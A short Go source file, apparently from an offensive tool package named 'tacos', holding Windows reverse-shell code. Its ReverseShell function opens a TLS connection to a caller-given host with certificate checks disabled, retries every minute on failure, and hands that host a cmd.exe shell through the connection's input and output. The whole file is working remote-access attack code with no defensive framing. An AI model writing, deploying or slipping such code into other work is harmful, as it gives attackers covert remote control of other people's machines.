//go:build windows
// +build windows

package tacos

import (
	"crypto/tls"
	"fmt"
	"os/exec"
	"time"
)

//DetectDefaultShell: return the default shell
func DetectDefaultShell() string {
	shell := "cmd.exe"
	return shell
}

//ReverseShell: spawn a reverse shell with pty targeting host (ip:port)
func ReverseShell(host string, shell string) {
	conf := &tls.Config{
		InsecureSkipVerify: true,
	}
	conn, err := tls.Dial("tcp", host, conf)
	if nil != err {
		fmt.Println(err)
		if nil != conn {
			conn.Close()
		}
		time.Sleep(time.Minute)
		ReverseShell(host, shell)
	}

	cmd := exec.Command(shell)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
